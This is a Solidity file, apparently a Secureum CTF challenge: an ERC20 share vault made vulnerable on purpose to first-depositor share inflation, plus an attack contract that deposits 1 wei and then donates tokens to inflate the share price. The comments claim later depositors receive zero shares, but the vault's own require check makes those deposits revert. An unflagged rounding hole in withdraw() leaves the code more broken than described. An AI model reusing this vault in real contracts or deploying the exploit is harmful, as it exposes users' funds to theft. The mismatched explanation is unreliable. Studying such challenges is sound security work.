// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

/**
 * @title BalloonVault (Secureum CTF)
 * @notice A vault that accepts deposits and issues shares.
 *         Vulnerability: First depositor can inflate share price by donating tokens
 *         directly to the vault, causing subsequent depositors to receive 0 shares
 *         due to rounding.
 */
contract BalloonVault is ERC20 {
    using SafeERC20 for IERC20;

    IERC20 public immutable underlying;

    event Deposit(address indexed caller, address indexed owner, uint256 assets, uint256 shares);
    event Withdraw(address indexed caller, address indexed receiver, address indexed owner, uint256 assets, uint256 shares);

    constructor(IERC20 _underlying) ERC20("Balloon Vault", "bVault") {
        underlying = _underlying;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = convertToShares(assets);
        require(shares > 0, "Zero shares");

        underlying.safeTransferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);

        emit Deposit(msg.sender, receiver, assets, shares);
    }

    function withdraw(uint256 assets, address receiver, address owner_) external returns (uint256 shares) {
        shares = convertToShares(assets);

        if (msg.sender != owner_) {
            uint256 allowed = allowance(owner_, msg.sender);
            if (allowed != type(uint256).max) {
                _approve(owner_, msg.sender, allowed - shares);
            }
        }

        _burn(owner_, shares);
        underlying.safeTransfer(receiver, assets);

        emit Withdraw(msg.sender, receiver, owner_, assets, shares);
    }

    function redeem(uint256 shares, address receiver, address owner_) external returns (uint256 assets) {
        if (msg.sender != owner_) {
            uint256 allowed = allowance(owner_, msg.sender);
            if (allowed != type(uint256).max) {
                _approve(owner_, msg.sender, allowed - shares);
            }
        }

        assets = convertToAssets(shares);
        require(assets > 0, "Zero assets");

        _burn(owner_, shares);
        underlying.safeTransfer(receiver, assets);

        emit Withdraw(msg.sender, receiver, owner_, assets, shares);
    }

    function convertToShares(uint256 assets) public view returns (uint256) {
        uint256 supply = totalSupply();
        if (supply == 0) {
            return assets;
        }
        return (assets * supply) / totalAssets();
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        if (supply == 0) {
            return shares;
        }
        return (shares * totalAssets()) / supply;
    }

    function totalAssets() public view returns (uint256) {
        return underlying.balanceOf(address(this));
    }
}

/**
 * @title BalloonVaultAttack
 * @notice Exploit: Inflate the share price by:
 *         1. Depositing a small amount (1 wei) to get 1 share
 *         2. Donating a large amount directly to the vault
 *         3. Now subsequent depositors get 0 shares due to rounding
 *         4. Redeem our 1 share to get all the tokens
 */
contract BalloonVaultAttack {
    BalloonVault public vault;
    IERC20 public token;
    address public owner;

    constructor(address _vault) {
        vault = BalloonVault(_vault);
        token = vault.underlying();
        owner = msg.sender;
    }

    function attack(uint256 donationAmount) external {
        // Step 1: Deposit 1 wei to get 1 share
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1, address(this));

        // Step 2: Donate tokens directly to inflate share price
        token.transfer(address(vault), donationAmount);

        // Now any deposit less than (donationAmount + 1) will get 0 shares
        // The attacker can later redeem their 1 share for all assets
    }

    function withdraw() external {
        uint256 shares = vault.balanceOf(address(this));
        vault.redeem(shares, owner, address(this));
    }
}
